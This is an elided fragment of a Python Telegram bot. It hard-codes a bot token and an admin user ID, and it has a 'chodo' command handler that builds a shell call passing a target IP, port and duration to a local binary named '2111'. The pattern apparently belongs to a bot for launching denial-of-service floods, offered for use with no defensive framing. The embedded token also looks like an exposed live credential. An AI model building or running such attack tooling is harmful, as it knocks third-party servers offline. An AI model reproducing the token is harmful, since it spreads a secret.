...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7951699144:AAEKWhjLjQ1cnG8AsuZEDaryCpFL31B8wuw'
ADMIN_USER_ID = 7780705131
...
async def chodo(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        chodo_command = f"./2111 {ip} {port} {duration}"
